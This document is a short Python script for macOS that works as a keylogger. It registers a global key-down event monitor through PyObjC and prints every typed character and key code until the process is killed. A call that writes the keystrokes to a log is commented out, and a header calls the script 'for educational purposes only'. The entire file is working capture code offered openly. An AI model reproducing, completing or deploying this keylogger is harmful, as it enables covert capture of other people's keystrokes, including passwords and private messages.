#!/usr/bin/env python
'''
pkl.py
:author: Andrew Scott
:date: 9-3-2018

If executed successfully this script will log key strokes until the process is killed.
This script is for EDUCATIONAL PURPOSES ONLY. 
'''

import os, sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from AppKit import NSApplication, NSApp
from Foundation import NSObject
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper




class AppDelegate(NSObject):
    '''
    The App Delegate creates a mask to detect the key being pressed and adds
    a global monitor for this mask.
    '''
    def applicationDidFinishLaunching_(self, notification):
        mask_down = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask_down, key_handler)

# w = Writer()

def key_handler(event):
    '''
    Translates the key press events into readable characters if one exists
    the key code is also recorded for non-character input.
    '''
    try:
        capture_char = event.characters()
        capture_raw = event.keyCode()
        print(capture_char,capture_raw)
        # w.write_to_log(capture_char, capture_raw)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

if __name__ == '__main__':
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()